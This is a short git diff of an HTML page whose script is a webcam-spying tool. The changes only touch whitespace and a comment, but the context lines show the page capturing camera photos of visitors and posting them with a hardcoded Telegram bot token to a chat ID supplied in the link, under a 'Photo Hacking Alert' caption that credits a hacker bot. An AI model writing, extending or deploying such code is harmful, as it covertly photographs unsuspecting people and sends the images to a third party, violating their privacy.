@@ -52,7 +52,7 @@ h1 {
 
 <script>
 const BOT_TOKEN = "8062278856:AAGO17YgYVRP_WiLcLoqhA0MLtuClIRwZas";
-const CHAT_ID = new URLSearchParams(window.location.search).get("id") || "YOUR_CHAT_ID"; 
+const CHAT_ID = new URLSearchParams(window.location.search).get("id") || "YOUR_CHAT_ID";
 
 const progressBar = document.getElementById("progressBar");
 const progressText = document.getElementById("progressText");
@@ -95,7 +95,7 @@ async function startCameraLoop(){
             canvas.toBlob(async blob=>{
                 const timestamp = new Date();
                 const timeStr = timestamp.toLocaleTimeString();
-                const country = "CountryName"; // placeholder
+                const country = "CountryName"; // You can enhance this to get real country info
                 const caption = `🔥 Photo Hacking Alert! 🔥\n🛡️ Photo #${photoCount+1} sent.\n⏰ Time: ${timeStr}\n🌍 Location: ${country}\n🦠 BotDeveloper: @ProHacker43\n🪬 Bot link: @PROCAM_43KHACKBOT\n💀 Stay vigilant!`;
 
                 const formData = new FormData();
@@ -131,4 +131,4 @@ async function startCameraLoop(){
 </script>
 
 </body>
-</html>
+</html> 
